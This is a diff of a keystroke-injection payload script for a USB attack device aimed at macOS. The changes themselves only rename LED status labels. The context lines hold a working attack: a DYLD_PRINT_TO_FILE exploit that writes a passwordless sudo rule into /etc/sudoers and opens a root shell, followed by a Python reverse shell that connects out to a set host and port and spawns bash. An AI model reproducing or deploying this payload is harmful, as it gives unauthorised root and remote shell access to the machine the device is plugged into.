@@ -1,14 +1,12 @@
-LED B
+LED SETUP
 #Set your Variables, bro
 DYLD_ROOT=true
 LHOST=192.168.17.12
 LPORT=4444
 
-LANGUAGE='us'
-
 # Gimme a Keyboard please. Thanks.
 ATTACKMODE HID VID_0X05AC PID_0X021E
-LED R G B
+LED ATTACK
 
 # Get a terminal
 QUACK DELAY 400
@@ -21,7 +19,7 @@ QUACK DELAY 400
 
 # optional DYLD exploit script
 if $DYLD_ROOT; then
- LED R
+ LED STAGE1
  QUACK SPACE
  QUACK STRING echo \'echo \"\$\(whoami\) ALL=\(ALL\) NOPASSWD\:ALL\" \>\&3\' \| DYLD_PRINT_TO_FILE=\/etc\/sudoers newgrp\; sudo -s
  QUACK ENTER
@@ -33,6 +31,7 @@ if $DYLD_ROOT; then
  QUACK DELAY 200
 fi
 
+LED STAGE2
 # python reverse shell
 QUACK SPACE
 QUACK STRING \(python -c \'import sys,socket,os,pty\; \_,ip,port=sys.argv\; s=socket.socket\(\)\; s.connect\(\(ip,int\(port\)\)\)\; [os.dup2\(s.fileno\(\),fd\) for fd in \(0,1,2\)]\; pty.spawn\(\"\/bin\/bash\"\)\' $LHOST $LPORT \&\)
@@ -46,4 +45,4 @@ QUACK DELAY 100
 QUACK ENTER
 
 # Green is the official Light of "finished"
-LED G
+LED FINISH
